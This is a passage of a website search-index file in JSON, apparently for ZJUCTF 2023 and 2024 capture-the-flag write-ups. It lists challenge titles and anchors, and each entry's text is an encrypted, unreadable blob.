2023"},{"location":"writeups/zjuctf2023/#zjuctf-2023-writeup","text":"/IgwxH7lwEYJLGlJWCgH0A==;Flluu5s89b9RWVgkMIUqOrrxhpDsclLw4UArggOOCOrRzuDVx1IqV4hcjIiVSBlyA15H+iyFx3WLJ/JKrY8yaawPUjtGxwVCns8pJc7TtHJN4PePNelGkLKje30O/xJRkhXiQP6YURh7+egm7ksdJErgsiunFak05U1oUmrTcU4nU7h9tawmBBVzJaa3fFKEUOrzoS33kBPdtVxA7DDUB+sSBdfpx3DUtpQlgEAlM4tWvZvoSYkPhjuPUuq8C02/tpIwsdYI/8E5vtOp6wAjF/JqbJPdxXEWxfzZEvx2tXveO2OvGItWHqMfKx5S13Th75EMQLWhUlzgQDOIzN8/6Wefe6pGeHiUyVaKTb01gTzPmm95orLl5MrWAnnA3BinM8r0R38kdd0sXGIhEjZvSmHYNPBLyxAzu3555iuW/J7Jws1xBxmrdKyd+rv2V/5LrfPNSZ8ANF2qsR3NqQDPepeYjNoMqj/0oUh6jy56Yi2HbCz4wJ8UR/6lzn+hHkoKts3iIbkB1QBYwscWyO6PPHhoAt0l7zWLGsQCMNv5v1EL3vN5aUuM63olWj6m9/YSU15HFocvWBGkhWRBwTo7inYBGXpM0hSqqhos8x8NJLe6P7Cq8I8jGvEpzobPOc3TRSVK/qOXwFPHXYXlASPHQZ7C7la8Ce6+u5F5PHNQJLjk7Lx9UR9y/b2QFS6uJPiBlRC/bR9+vAMb7pQHd0ycRJHGX3N3/HgSy2YZJ/MdcvM9qwRipD+WgajRiNEUjkzIkmmK1mQeKk/ztxrPPb3g3qK8D+9oQtM+LlDp42oz4ktAXLBLqrFeBERgDBA78mx+Sq9+DaJyjQTqteSGL9lIA9G1zFKmB7H9XEFpsG70V2BH0q6/hIRPXpmXTg9+G5Bwq91R3vV4QxJc9idMZU4BPOe/ezmV1Rgvqh8Fhy+Uo9J51cC8D9rTN4JNjd1d9jXnYbUxd7AvYQTjgH2BTPqZ0DtHYOXANE4un8lmFCDHwL0oxihEDTqJ/X24YRNAtzdS7IH4YH08h3qKUUqDCynAIU4r2qlqqagvqC2Tgn6+29lLxRLPsKJN//GHMXkV6lR3gPvqYWSPWCLlLxFLMkK6wG7iMm8Qtb00vMwQme+f0V/CSuM1+cQ7LK8hmcKPxV4Z66FfGkV7zn8ZDoQ0MZg+CEDYwk9sfeyHTHrQuNATAyt/5M+wSvf90Rse7cifIrNI9iRdcPkl2N8zT35QwSZAViZAkhMKWWR1l/GNw19XBS6cUGr64PtrGR3KGikPSyYE;^","title":"ZJUCTF 2023 Writeup"},{"location":"writeups/zjuctf2023/#_2","text":"RjVfRoXK0kyT/oJEBCgmAA==;+6CJUWLc5+mJ+QeyvDMABbScXLPqTLlpj7Z6lQ+iB3+QzB7xAfHzppVS32R8VoApOpAEyeRIuFRBcUZwCjA3bs3vcTaI21VjVTh8QQ6HZ/kEL7AkojJPfYiHOobq3sxkpmty0zWaw90CqvbhwXxUSPQwfh80mqwl2/lvmcH3UE4=;^","title":"\u666e\u901a\u7684\u9b54\u6cd5\u53f2"},{"location":"writeups/zjuctf2023/#23w40a_or_ctf","text":"oLeuNe8aVplXhAyPQT0ApA==;U0FYdr9LpA65rF2dKKRDazLWApitMXFuxudZmkN4S36T/XJYPa/3W6grqe4Y6b8dMm01zcu+C33hpw9cQb91xNs6p6t1ZC5DTg4AMFDJmnQluo+9m43Zk9DnWFsOvJp0QQh2SFzFyu7PAxoD+iUyYQcNTj7wlQSLyrHJ/Zcy6Rp913t+sy4MIvYk0GQZUkeiYBXbajU8+mFVDl5qFKfp+gONT21YVhxaNDtRMoCD4+FTavUR7+6svmuZX8c1F6hFEoRmpPcHKURcKDu3CfYW3RkAzir85fnYD9JODBLlnjR4yRjqHx1DR+Ds4oTMeEWSn2V7jcPrMtsj3PYFzq/+R8z1ogqJC7Mn+VzZAzUc+FI2nwXP49cdkpZLIMhjmQXds3vi/RNTQ9lMW07t9LiYADHhp3oH6mFWelXpUKvwlcSGszyG1/jZTbBqWO1/qy8TQ2doiQLBlSvLC7xtOfTEInP8D/E9EoohKieW9c8lhr5KF6GCh0t009m8dY/eNJHZemTBUr/NhUBj/JUfIogbC7ObN4tvzJh3k/gHk7IbAM4=;^","title":"23w40a_or_ctf"},{"location":"writeups/zjuctf2023/#ruru","text":"a2DE4L+qli8XB5nFqSHBhQ==;vV+hwMGRe4KWXPstDAeb/pPHdTA5/hV1YLK1tNy0FlVBzW755B5PbVlhKWtlwQKSMHYAsLYRjhWjme5Ll1VOYraFI04Ly2jx49OEThRp5DPVurr58ebj5qD4NILnPkp6YDD3qQGxm2tLkykEMCjRe4eaLXlPINhGz8YR7HkXOfRnJLa/+HPpO4kuncK4yfWyrJauvZVJFH1uXVDApWKS2Q7iq5Gw9yIjb45P/iUURzae1Ya9vDixJshnwhv5V0wP7KkvRIQoDNASxoSGPcMvIhw4eGPauv5ZSNXka3B+Mi6Uei4jdm95vuKCMagnagOCDiwnucmxxUF6wv+52rLdSwih3WHQkPkwJ5b4GCKwa6/qdMi11GMRx6z164bNTVmSX58ir3vXKtNQPHmD+C2BwB9sgRm86Bh+XYdMrQq3JyA=;^","title":"RURU"},{"location":"writeups/zjuctf2023/#genshin-impact-format","text":"W2naDfb27I/Pjm3EnSOFHg==;wDUaVD0uxTZgjQ8skOgP9pj3cQ4CqIAI+M+XycRajmUvcJg/hbSrUv9uItQK4JnlXpIhy6dq6ENpbtODQWJWSbvDVADOSwkaLHYKw+xhxUcqbTWNTGPws2AwIaQsTX9ttJAsJ1edmMbEXZA4PdF9GacQO38F34o2aVSFmN9+E/mkgzsLkdQpeo3WEmlE8rXAMX0yjU5guIqEgpDEV+ghrA==;^","title":"Genshin Impact Format"},{"location":"writeups/zjuctf2023/#proof-of-work","text":"dTf9Btu2NS9MmkJ7dvIpgw==;VA1zMCAH1xwLGDsTYq4RMkpsHoVsr5FIeN2nQt6V8Ko=;^","title":"Proof-of-Work"},{"location":"writeups/zjuctf2023/#quine-relay","text":"XUXvDBCdlz2fPXFXnvec0Q==;2X7pW8Q3tUaytGexoH0jSU6UOw2k2g2vbiRJgep4KQ5DANEpp/WfueDGYiiLXlrxINkTF0aWDInm5yDpLNsmxoucdeJr1smKQSlkEpZgu0pHuND05Z588GkImejS5+8t;^","title":"Quine Relay"},{"location":"writeups/zjuctf2023/#minesweeper-master","text":"S4UaiaTMM1dGAn250O+4Mw==;vCWyB+sgA79ifasWe1ExFCTMeTj973ZpaAD20D9Y+ek=;^","title":"Minesweeper Master"},{"location":"writeups/zjuctf2023/#easy-reverse","text":"+FcLNEIJUcbiEV0lnWJpvg==;pDlSfMj0IzHj3l1FYvfDRgkufH6TYbt+Ysf0FQgNHEqxtpfnYcAmg71QJwehT3qA1PhVNfxAQJYQFEGiiBSns3Cp0moDdpE8xpjc6QH8dS52igCzs1gnZs763qxWfikmYDEjWBMhA641pWmrNC28uMsYn/9O3dkX1sUYNokdwas=;^","title":"easy reverse"},{"location":"writeups/zjuctf2023/#hash-predictor-1","text":"lpSSagboEWl+BlYWUeeJxg==;PePWIwGkK/ASEFpcMJiI6BX6pQSVroIDVPVEG2jl04olLDf3ofM/rr172+mKcNEJOdyVHgCgWDX1TeJnRjzg46MFoZzeEF/YLXRaL7s8ojDfayWbWZQRgJANxxKEkwGMTd4mUDxf9baFlVyQ7O7L5wUZThUd+8sq0dl6Y6e0np2ihfQi3iNSNdNVf5WcteOBHkBB3tjbQKKC3VC/zX8h8tw+06VR1whMOjs7w2l6CoN/Zss0n2zdJxS7v5BWgM9Q;^","title":"hash predictor 1"},{"location":"writeups/zjuctf2023/#hash-predictor-2","text":"0gJ/aQ0+gmkjZ/Q7Yn5eBw==;9RPLVOh903iWB3yX0AZWReHMHyWudLkceWy+SD9bhkbd3AJAnVAf6EZRQfpv4mVZjY6U3owMp6gQCf4xqOfPgPXB3Qgu1TOLSvx6SgciSH7JQq5WQ0E/kpBi29XnV/L5;^","title":"hash predictor 2"},{"location":"writeups/zjuctf2023/#welcome","text":"FBZGGPixMpGMOHbaXr4b+g==;ZTch5RCCRFu8W9lE4P6XJbg3dvxs5I5pd6yzKB8oVPK8tGy+IaYg/REOlMkELo25uWqC2CQR/3LBUlY9O9CoLQ==;^","title":"welcome"},{"location":"writeups/zjuctf2023/#baby-sql","text":"2uO/IUWrYUVEBrRsyUEOqA==;AzIcqDnS68WIjgCTOQDPTpxtNKAxZK/0KntI99Ea4o28FDbc8r62KTflEnXucfp+liKGGPferPomD2Z0bzTMGA==;^","title":"baby sql"},{"location":"writeups/zjuctf2023/#easy-sql","text":"ccTvG7JSo65GrbuzHETa5w==;GsGZnHExiwp7uhiZZ3xdtHSSEMQUKorXsRTlNcPwkhZ6OGMpICsL09p1VcjWxeDjGq65CXtlN878KR0tlQa6FTj0fsLeRGX8xZJDpox6l/W8gJ5qRRwz056yZk1ZT3pq;^","title":"easy sql"},{"location":"writeups/zjuctf2023/#babyphp","text":"hkbG3dCgD54HVruw3iSxJA==;rZssTF20wQOCdKGM2gT/F+kNr/bJdY4O5P95OqLAlTQ=;^","title":"babyphp"},{"location":"writeups/zjuctf2023/#easy-calc","text":"79+fm+dapSSckhdOuQE0Vg==;k7hNIO1mlPEOpS7ROkjMlvVfomUA2lS24V16Jl2ioiTn/Ros4thObpIvlBfZ4wE/3Fb5GekDLKUplQtOFjfRrvev+ectGvz2NmVS1i69JK0qMsXMrh9z1xV64Mx4Waq1;^","title":"easy calc"},{"location":"writeups/zjuctf2023/#babyfor-realjs","text":"hh1UhyvHrRl+zVRSQUqKtg==;eqnnmyRiebmE6Iw0XGhPHrKLf+/klyH/cMh6SJtq8YA=;^","title":"Baby\uff08for real\uff09js"},{"location":"writeups/zjuctf2023/#rev-signin","text":"5se2u/Yh3ATQTyrQSgM75Q==;fRIMuuXQoquSkeGTOgy8rqrskMGvkudyygUnBPjOOrtDm/AOu5Kr1tQDVjQJKrsQDK4yeyn2QJ84H2B9GTYUaDnFh+x7gjFGNd8jrt3Rg1RVVeH7LiJ8Ve6XoIOmKXfE;^","title":"rev signin"},{"location":"writeups/zjuctf2023/#zju-dorm","text":"JzU/lxlkoYo+4tAIZ/H0nA==;5kQ4305GQAfPy/WaG7n3SbWtnJazSnk5OCGblnlsSKAd+oHizmkOpvTibvPCaxZNRHvRCNpXVeG3F2HzyTcWn9FRfsN2Wl4cGxT8zEXdiZzaP+0R8nGEKARGpgRaBgMn;^","title":"ZJU dorm"},{"location":"writeups/zjuctf2023/#if-else","text":"TQryEUDmc16K+0dSkqvAYw==;PADYvIARdnmsi3FZKxcjTgIFOx/UXOK5NDe1QL9yMoOQ+K1QUFKf4Qu2YYSmKoDMNv+rgl9Bl2TACm5EHKO6bzWoPq+oU0aOAe5red9RzFuIV5l7ROURkTXJ4+bwY5ApzDZ1pVqagZmobXrKxMo6bwN1ZHjhRopjYI87aRXKSMU=;^","title":"IF ELSE"},{"location":"writeups/zjuctf2023/#500mazes","text":"mOCco0CF2s2gIj+h7+dj2Q==;XaLwIM9uN3iCUGwZ4zoeCBH/v1MspDIYrpNamzXwWxFURk1ue+Nsc82OcmR361XX0OFT1f6jqVZfvlDQRrTXWyQhbwwrUPIY6L9sCwSuOkpGXmPSbhlJ5YprtbXVNhJcW7Dld/1GEaWDc7bs+u0K6oEABLWOE274AblBLIAMzXJL5UJO5MMLrDarOubWJq1pgeVZ4v43TG9+tyr1Plx8oZFSX8wnGqD9ouLDKYsvuD/++65otWPwAamib7TOuzq/;^","title":"500mazes"},{"location":"writeups/zjuctf2023/#_3","text":"FsgA5yxoifIDduCd++avIQ==;Ur9qVUpBKMdBG1+LlTxbFFQJ+N9jclsJ7+gzk78oj3Ci518OWl2rUK3BWwyI3sAcO5Hp/fqcU3c7NsCaz4MCFRBHJdrhgzWGip/Fg2uD2VwaQeRgiZ06LZDzzQxAwXNLs+Px0jZBPSnPyyyYTSrqQ1womgoivEoFfigEIxD9vy99ZKyiPMIcmBQVGXyBL77YOn2rIlIDph06Cs0HnXrcpw==;^","title":"\u26a1 \u9065 \u9065 \u9886 \u5148 \u26a1"},{"location":"writeups/zjuctf2024/","text":"yJfFRaqAAGjoRdIepV471A==;;^","title":"\ud83d\udd12 ZJUCTF 2024"},{"location":"writeups/zjuctf2024/#zjuctf-2024-writeup","text":"OqEuaXWoIm7aw2xJVbMbog==;tyjQcJiY3PRZjcsudfUc2XZA0vIdFTTdwOOL+7lDIlljcev/ev6WusQA3bwspXfogwDyw4RmPcWxCXW6IZvr9NLCUIhZ+3KP32ubZI4pP6yYDPLLM4YyMFsa01Ee0D0TtWfGyQ4Ap5ncqlgaU+vjHujUt8c1BhTq5OIWAz/eqfGf83mZ4wrBoY/Ck0kyHtPmKDcjekS2zo0auBGBMcg5fPfqqnJdcyeeeMuXaqWRF30s7mMEUD+bBc4iO0QYJFccGnBBOMmilEiKrcHJlKnvkzoANT97RdteJnJpELTprWDDlhUYszTR21rQsSM3igEAkcmHSv4vFKZKifijG2KeMl3HKEvCBwyj5OCn5VQjk/2wiX1ndFShKhx3B73dN/xw5wUbJ+p6w+sr93LNzH7mi+Z1jhgntyZYvYHYm0TX+ZTJEKAGyrGyHHcgxqTUgtyoA95N4GJPGx99Dmtqz3TeBhKgtinoiDg5nOJVoPh+vt+VdrNTPUgW+wU1UdkaDWh3u81vfTT8fTDHNVsH27WYmdyAu+LPuDKAEJ9TehibEMt+tD1+xeShWQVIMgUU0IkoNoNaHNP0g6Ql/9J1cGs69Q==;^","title":"ZJUCTF 2024 Writeup"},{"location":"writeups/zjuctf2024/#misc","text":"JTfahmascjUha0cfuPHe3g==;OAO24ZIYQkoIln+vvgyzNxJG5D5+Se1fJwCk/IW5sYM=;^","title":"Misc"},{"location":"writeups/zjuctf2024/#a","text":"yi36Cr+4gJTMGKgBozQe8A==;cC9ZhqvDCZAAcea4PBamXdgZwmmn+a7eh8sbqB1Fd+9UL0SCWFMJ+Vzsb7YQW7DcGmdMBdoOR5Vm80qx5Vnp6cYjB4lGx47hB5D3O2RAK6x0ytKKC/KuOiVQgbzfZFEovLALzAnXVVEh3xpvV/stE5FeOYrpgtQUdlVsx7SZBY2J9hU12R7ViOPR0A7vm61EXBntOgNKJTzufNAPN0ci/rRhGCEy8VJFb2KzuJRTPaT/XzHRL6YzWbQRioZB8lJmDxAFcI1HDrNVFkJtIy5JfC7lwloG2/mmPZ929qTLcIZPmgUOlgpRhyMEyonb4XtSVTxlmbaOBkqlUSTY/HvEz6o1x2tFsFWVnF449R0Yp7hY+RmU1uwwOwDE1asTXb8eVZwCwQDO7tDYK4If4oNmd/ecC2Q1iUNXgbbnNfr3/tWNkb2oDmmJtx7y3MHuavZs50BxnifQUD180wOxcrytAk/YI8xhYHwL7kH2Wz/lkC7CW/e5bJByIDeOnldST4fftPcMjXnnpgZ6foPM/ArUVR4P7NjKvD1nZOOFD2oT6YzVloKau5vI67jum/6mEvzeAZ2Lxb/G8SKItlamYoZv150w6rmrO0Bm+35lRlrATL1ixXkkPRPj0S1YoOvX2AUwhMQr3L6QxFpvF3SYO3jacKsblaYZ+dSwnhAyCAdsJPNpXpl/vti5Fs8jeVNBVHlzf/BUHkVjO05wPi/ASDUxudKF7HnK99bo8hfVmG64QBSsY5Q7naIL+LKyx1kNAtf+ty7qMPzEyMj/+tn4MjDvY5KTAAaXtJiQ0lc953bw5o8AjJDyNv7p8d7L8+pMCibduw6jQnqX73stLB3SgwUzxgz0JYjsJMgJTqazXYgPapnxmHwqFec7b60Aqb3j2IZafgakdCSJxLtZzfED0OFm6r5dcmmu5kY1+M3OzZZTq50yEqFmPKiO5q7losn4DUR+lah/3XiEv+3XQhcZovnORaTDWvEnw7U13KU/PtGp0Xop9lSF3MX3rCmhVBU9LpdeFbjN/gEcisqHlqJ+vhHNyFG6iiK4S493QT+kCNAQe1/aRB6KOjf3yq46BIUGnwGYgyCry1kbGWrhkfW6v3op7g==;^","title":"\u5c0fA\u53e3\u7b97"},{"location":"writeups/zjuctf2024/#silence","text":"hO0JhDU3wygtZjJ0WH+q3Q==;tUkLW8n7cuNLXZjbMUVIUZboYz1VpLJxdm8jiT4+t1GJ9ags8h92QGRWluVgMEGzV4QCMk5PmJwyFQ6pFr/d2ADje+Fwl3WkU02VC13xjmpBZ9vomr80Eu6l7IBuR9QTcbwmJDW7zbxtxBEJeJRJVxzKncXi9EpSX4OP9PsznzYdMNfGJgXkkQuTZSi7L6ZEDSYqAExl7NfHVkXiTxXneWSqy9de2mp6IQLGWLLGST2w+HDdzAT3/juyyxLyYHHS;^","title":"Silence"},{"location":"writeups/zjuctf2024/#master-of-c","text":"X/n66TK0daSbnVb81T09hg==;gVNXCQYXslpFlMYwNiupN5F6ujK+cL4w4UPqTgINoFASm4y5AmzjPEej9MQhfmcpAJ3fzahVACdhSYbhxYCrJFHVvsCQj5q3dG2iUwAKT9cyTTbPBcTZMXvZPNRmqzZX1ItMbUGLyFPH6p/YRy0N/QX8gEv5H4LOasGASLG0REwXUONveivurwNCEbu78ViIxV2jzzfw4XAhfLwkqT/aW1hFZbnVgNfuhrcZJxjF/ogLItTmCx3T6gInbrdNAwW8JxDCnxxxM8EEYXSXtEfMnLC/cj7qljgcor/I1S6mtosXAi7yKtRsZ7TgkUxBKifqXpMLabCK2yOVRm8VbiJJvMqsr+KUP9S3QLK6eZ2C7byBTIKlTlvqaGTqnRuMLOoRLkMUWxnS/rwnYTjmkiAj6s2OsyJV0d2U0XQW9+Tbv1o=;^","title":"Master of C++"},{"location":"writeups/zjuctf2024/#cba","text":"tgIni/qca2PZfcT6DwlSwQ==;Xu0bgvA+R8TZWXKb0pmvpalKetzKMbXVxQn5JZb+papRmtOTnKluV6nZ+Kukb5C+UQGaoRvBwUpcuM58hGqINstkkk2XrfMNwYNdG9AkK4tp/P+xddcqUQ2HDONZc5p+gyxB4xbF5Tja/OT79IQ0+rz/BoFzPm4xwBimxVzYOK0Zn/RdF4SPqC3tX3LHFNfOpeJnbPo8NbeGfZcia5J5s6Pkgr05tnAlBJnLzH/JfNCaVlLyM873HuinLew8YmI/Ez8/NxB1qXGvFVFqIoLMsyyXynN4ZV63QD5ROnYHDjE4QIn9i/FZdTVk2g7/MHKrTBKhBAOW1xIs+PzPSz2P4g==;^","title":"CBA"},{"location":"writeups/zjuctf2024/#_1","text":"ZdoSDPl7hEwSkPcNrcxbrg==;Q8VbzUdVaZG/fQpewffJYylw7t6FJ/pPNr7Woccf1GyyacWEH1ziFJpkGw1Muu48e/yjVWu55VMEYVe2qwIW6b8ZhAPeu16M7tBnv6s9dcqjXUUQiMqRSbZf/ueWXd8iQ5EBUBc5J6aQNcgQTJ4b/HXzskmrtSTgRgME9eOdNj1opwMSrkS4oHNzE/gQ5ZHZWCDfgRTz8YX4+dfQ/+f+QTDnVS+oYWI3m5Y/+3IwhWii+uTIHOcNG0zdhqVY/19q7kPwBdLHqC2d6zcIoRApKOWHO0YE3TQCt5FHd5grQ97HwPAFQOu2KCuzfS0U3r1Gt5KDoFk431FnmAMR1wm6nG60zwen3V/IdfD2K4IGRWhdWo9rTEldNuPbtbPiqfrMqUltlqiv2KUGRLNqXm//+yc1SlcFQMo2Xi4awVtgBanUGHdZrrxU07MMYLXBotWFZ1xRF7GALTo06lDRwATLhtbvh1ZlbTRxkFCgRJ96MVXQ2ORBmj3tYx7cTPxhsKApXx7UINhIADw3Z7HVgLfE1V0sXZ2xkZ+qOPt0u8dAMnbTlsw2siKZaNrQkFzEQKuwMfYqYor/cY/goAwuhn93bw==;^","title":"\u9505\u91cc\u635e\u9762"},{"location":"writeups/zjuctf2024/#bytes","text":"k9UfoJpsS6a9PkEfmZ+95A==;AIJDaopfjiHF71bS+5R1RA438YPa+xwxPOzzeJ/JXQr2bQ1QsoLR2RNTBZ+/fXfl9QYai8BKiLq4PXqPhWO1VFeS1PPmWhpgEvZY7da/0mJxtjYULjOfrpUKFgmsdRpDM5fG0hgXxjV174cD6ed0pHCr23vkKwNY2yz8KvnQGre5KLmXHRIi6pFz7r3/Nm5ihhAd5vwQCqZRKMMis48PaQG7+gdIwcVmWOHpZHwi279nzYjbqafQEzHXFxKzAOMoB1xj77gRHJOmlDf2cLY5EKb+1uBDGLYM2BwdiuyqgrY574lvx5M0MTEO/OlS9TNnC5IL0aio3HvctKYFRDBMNQ==;^","title":"Bytes?"},{"location":"writeups/zjuctf2024/#minecretf","text":"NaPekE0qYMppXfI8aA2/Lg==;vDdKwqhsBMZb9NwD6LiIUkhBNtJOtaAJ8i8tTwQ4LDdZuLTyjJ9ZZCbVptAudP+MEdpb++HFb0OsvozC0KTt214DvEb65S84vHca29F81fseOdwxuqP1w5jHPUhos/yDmteT1nN6y6w+v+exvyuUbVhns9VtSSxMDGkbVcBaiMFhsXIzyN8aiglSTA8XYagquPgByP1o7H8AGX4P6IErIxv8fzsS9EAOAh9WQmIsKJOxdZ2I/unjzLJqsMLO8aTgiByZOWx5igFGBIBrvQKix5LPFpXSYqKl5HLFAU+8+BmCGi2EEQUtJa2rWq3CFxuEAcS3tEyVOanqKUSYts6d7BKTY5hCjtmzBM9QvcgPM4fFJmUehxDKPyvV022fid27/1dllXXMQwEgh5n6SIXkY6eMP3XpxBE0RT1nH0fjGrRuE6oz3kNEF+fomE8L77PaL2VPikASoY+HZX+HdVtKutlPvR/wB4kv9OycTFda3fDcXEj/SkLDTtk+fosYCd2nHmK50pEA3gtgnyXy2CVAP3Z5p1iNQxxMbpIO+ZhdQ94AF3Tv7h2nfwYpHKUd+kQj80n90WIdPlu/WI9xaFBPX0JY0g3OkCKfFXheJcy201msPRN9yaIHLmgUznsJRLVsHyl0QNfHK7dKl6r339FaiBWL4Wvs1Brz/yS2yPBHzxizF+HeUwF1BtqEx/AkYyYWfxcLgPa0IGKfz8MyWWvezRO/R9FKqoTF0nmt+WVCaEbyboKbdppbFJYmPIV1oZyR7tYv/c45XKrCuNVZUi/297lLbAP01ex2fsA/gVowy2591gzRC6vnaR8eBBCLCMleYwHsqNRR4+G39GXGw3wtph/QtyJpnJI98gaHpHaCV+oKO58w7bqnelrLs9F45Ua5iR56iYMpH3zStX3AqxeYoMn41Brz/BIzhWLB7mouYAc=;^","title":"Minec(re)tf"},{"location":"writeups/zjuctf2024/#reverse","text":"VipOxYJkxPlg7VaLVCsUXw==;WYQ8km2+ovVqNnrQgW8NWVCv8do00ahOGADDi8oKVdw=;^","title":"Reverse"},{"location":"writeups/zjuctf2024/#rev-beginner-1-2-3","text":"Heeh3Nopo89dqK+BcojiPQ==;CVU3t6jTHvjP4Er8mC5Y7JGHh9SF5CgVb1EqOR4O3ctt9pgQa0N7ZwjBAW+iGiG8Id0rWL7Npb++N8Lq8/KNd76dzRg5n4ZEYx3i6P63DbKmfbs0IHD9xaQBD5maMLTo;^","title":"rev beginner 1 2 3"},{"location":"writeups/zjuctf2024/#minecretf-unity-edition","text":"hBBgXQt/gTwva3HQAW7PPA==;1XC4K34hy8YywKWZgienNJUulGFeidhvfRtbtAOT6cHhEJAgbHnuG6mZXIgZY/AemOOVzYyQujkN+ygJ5Ib1bm2UAOYxxyw4tGpKdDTFZq9pGGRMG81D61dWbHxi2kZAocVY9MsaR2un41Z5sK7bJWIDRfBjb2cjxGjRd9/IEWs=;^","title":"Minec(re)tf Unity Edition"},{"location":"writeups/zjuctf2024/#rukma","text":"eHVzdyi99EgPS7zdqbHCBw==;vSRQi1HxRASUsQJmGDPf0Gf4FN07hDSdJ65WAsub/biXamw6YRxmw0SJBWj8rZBHyUL27qU5ocXLA8PLuK6JAVT9yP4xG86j0BF4eBE+Il7hgYCvBcNhR5zXBc1VFZtaaIv0zQdFw2XUhBfC2VXZDyaGDd89/QWKQhNvvcq572I=;^","title":"Rukma"},{"location":"writeups/zjuctf2024/#easyhap","text":"zv8p+p1RD2BsxaAdiGGhmQ==;xKg7SsGbIxgFy+z0+CKV2ujsDrm34vrIvEEFXVWM0AtHJ+SfFGeOsigmY1CKanPHpmWEy3z8+3AqVV2APYrHQBgqzLjxfjrexOAzRuMIodv1H/k2+WCn+0RXZ+8IDQVJg5DGdngHL1kEIYzS2/1swnwKqRfANOpLjzf0S0QncqFkwW5e9wQ+DvBqJhDlQBMV/lQugy7aMJZiAyfN0DuL/MEL5L/Qyi/WS39M85gC13nd5Sx10LDJpFKk/LIRNjcTvISj+YFt3SQ4LfBbGzUerGNzLgmDguqA3j095b06ofDGnmsiLuKny3A6YOUFjo+DrMrje7mSzsKg0Jt4lZQSy1q+ksuSeOLkWEBIz98sNlYgnR3m5piWMyImqyZ+Bhy32E4mi+eVAusvHJQ/KLWXGouRFLs5peJGSy0cqlOtfm5Y8XSGo7K0WTpZSlQD2TzhslNjrX3XpCYMYLrv2VmxAEh68rp/9QQcJUoYd5ey06QyV+f0a167E+mQNfU9eVFL6eMy41CCLWr8x8QR0iPsTJMgtgNirwdNnv8Q9Ehyyg5xGHtwnx85ZL9Uep8SOeQNvoaShNSZzq61bE9ubV/MeapMFt3Q5bKUkUx6qCJ9n9rfkJ1/uqHN8DKrTQdIXSub4DYM4ni0YGPTEBsWAKjb8AOREgHGaNgHwq9VPEYYPQaLy5sqx0IQcjkXhnOZmfPMGF53T8JIwMeVolTvYHClpU5bOk8t4p1d68DVRdCy1aQO32d+vs0wRu0cOoVlNgDQG8QbxFl1ZICij+K/J4s1y3vmO1ad+hhHyZ+p9u1dZR/ylTr1wXGoybvwpNcj4jjEPuy7gkgkLGg/jJ16OT2s6uMTd5UPjzMRvaW4sewh+qei0RKvr+jA99TjcR8Z5Y7QLxlsRYf9Tp5YV3JUHG5BufWzdT3OrC1ZB3yDmNJVsVwjWSs4eqkp1vDGmYBD5HFWFQREDr0jtsEIdJzIalRDpmpzI/yghM10ovAMBc9J83awCgaKnoVyPFeMnDvvAeAefrOPk0El+xCn06xdpyncZTxN5o0R7C4lHcjTC8dfPqS1uRSgoUpPOxcnLPu7lr1SnP+Nr1JD+PTEeNXhE5SXf/zVZK1vCMpc32KEQ/y40MFYvzRjhz8FhwPNiTfnXBLd;^","title":"easyhap"},{"location":"writeups/zjuctf2024/#web","text":"WPfJL8PcjCYJhxa12h4EpQ==;XfumMR39zMmyk2l4pbUpWqbj6L90fQMv5xR9LwDNScY=;^","title":"Web"},{"location":"writeups/zjuctf2024/#easy-pentest","text":"LOacOFMpJ0tSJ9Kj+k6e0A==;skAX5trhbvzC4PGnniOCXmh2Qdp/QOfjys63MdsSTqCMwWMKISOVBMujqyeiFk0mG2jhrDpX0+Rqi0BlHgpprrXES1Ndj5bciU9IyDUXCDOgc0nfeoOwQS73CohPEfvrIwlGv/I3tuf7ARcJNh3FGz1MA+/mFVN2jbGAuDnSg5HF6TVomWuV4vKaYFs30Nvsfa/UjV5gLWdJLzSlBc4aCZo6Bz14Cz9fpLYpwxX8Z0zaWmDvfIYusCErkdWrNNdFQXb7fcLjd6bYYVUFuU9215JZWcAq5Xvbh6WB3v7wZ7NVEtyLCQw2qRNvSOaKRvOS36VFZ06GnWSDyVxjwPyPjYg6qdAojQ7m0EKX51Bt8SoKy2Vl6voaHkkXV4eivhrH3el6MyPF5QubYahYznl0t5+wi3arLBSpE1+8ZFxBY/oQaelApeAgZrkzDV6wXV+jJCj8X4hJfOW9zWA3oiIg9Oeo1UgRHomfSvkQ9pKOoWJm7DRIT3g+ukFvBxGn2H/8X8K2sRU+ceMC4zMyCXHMJpl+wqTjdnfSA/L8Etb/9Au+l/R5XjSqcQxFOQeWgL//0wA/fe9MgMQ+a0TxdQYXXO/L51YAx7BsbVTL4QOVlE1N7iCcy7txK+RrzkYWfUwIntCTi4Obd3RCyBwEaGiF3wchWWAl1vKaTo0GkgAmQb4i6PAKOIpDtR6xTT/jdaKDWow2E+9JRWp3kCo70yQ5FxMivyan/leh0q2xnKbmW6fe0lkcEFQRtTGzkjnzDL5Km+Ia0KWU+doVB0/AGWygKb7doYIg/N62nEjUoTVQ7g9yOOQBGzFos5Cv877QeZ3pXkIqslkfxrPH6sPFJ5/MR1SVDFW3EiPB//UVDm04Jrm0kLdP8ujKrJr4wkkoiU+Wd2pV3hr7Ruv62/amq2nrLzwLpe7iWpnF5H8vyxJklNMCmmM5EWi08x5wdLSYDBcntzx/wWnyJTiKlvU0sfLR8uIjJP87s3YIPkurDXEgq8feIanEEmpXpdi7Mmuew4bBdQF5wX50+KyNTsQ2EV4ZflPV4JE5PKtu6LpqXpulevY=;^","title":"easy Pentest"},{"location":"writeups/zjuctf2024/#easy-jwt","text":"CgKNt1EVgQer2KbVjG9mHg==;wkr4wfAletgtROT3MyDLd0QzURPAE6g9nY3F/hwTF0ipOrMtJ0PL12tXcTx2KynqXQ87ZJEu5CgTAx2bR/BKOAoxNQCaIJe/HwwBo7eA3U2eFpfAMWB4AySgNGnnxytJ+cWUw/q5zitQxgi3lorPO+9+yeMPQpPSUs3NJ9VrYUvGhK7Z+QLgWemVRbTlw4kBxD4kxNRo6JuE3E3S0M4C+C9ixZHahc8cwgjgbjTIHBcRiJa3twbxpA1Lk7jtM1usLY0vqzjN0YEg2MsT6heo6ITUBla0GV9J1UgK34saZC8vKjRmSxwzNutvgX6kr4INvDXj5NuDf1Skg5tIOjEjTWJoXkQ3dpTR3j7xAEQOLrobC79T4Hx5ghn+wWDl/xezOAFyTNqDtJJDAwkSmYynSRZP7JtCHs6zR7RQ+Yj7d2EthjChTPrG6yJIXhhYcHOt2lY85Uiil0sumYRkIRT7FwAZNCNsIwnjU2OKzOp7BtOfA4IrGfJJ8N1TGn7m3AUK;^","title":"easy 